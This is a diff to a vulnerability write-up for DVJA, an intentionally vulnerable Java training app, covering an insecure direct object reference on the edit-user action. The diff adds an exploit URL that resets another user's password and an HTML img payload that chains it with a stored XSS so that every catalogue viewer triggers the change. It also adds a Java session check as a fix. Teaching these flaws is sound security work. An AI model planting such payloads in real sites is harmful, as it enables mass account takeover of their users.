@@ -13,14 +13,17 @@ userService.save(user);
 
 An example HTTP request such as below can be used to exploit this issue:
 
-```bash
-$ curl 'http://dvja:8080/editUser.action' \
--XPOST \
--H 'Content-Type: application/x-www-form-urlencoded' \
--H 'Upgrade-Insecure-Requests: 1' \
--H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
---data 'userId=16&email=user@email.com&password=password&passwordConfirmation=password'
+```http
+http://localhost:8080/editUser?userId=19&password=pwned&passwordConfirmation=pwned
 ```
+
+Adding this IDOR vulnerability with the XSS vulnerability in the list product page creates a devastating combo:
+
+```html
+<img src="http://localhost:8080/editUser?userId=19&password=pwned&passwordConfirmation=pwned">
+```
+
+Now every time someone views the product catalogue, the URL is triggered and the password is changed.
 
 ## Solution
 
@@ -28,3 +31,18 @@ Any request that results in access to any system object must be duly validated a
 case of identifier based object access, consider user supplied identifiers as untrusted. Appropriate scoped query must
 be used in order to prevent IDOR vulnerabilities.
 
+In this case, we can check for the session'user to authorize the user to access the URL. This can be implemented as such:
+
+```java
+//check if user supplied ID is the same as the session's user ID
+            if (getUserId() != sessionGetUser().getId() && getUserId() > 0) {
+                addFieldError("userId", "You are not logged as the user");
+                return INPUT;
+            }
+//set user's the same as the session's user
+            if (sessionGetUser() != null) {
+                setUser(sessionGetUser());
+                setUserId(getUser().getId());
+                setEmail(getUser().getEmail());
+            } else return INPUT;
+```
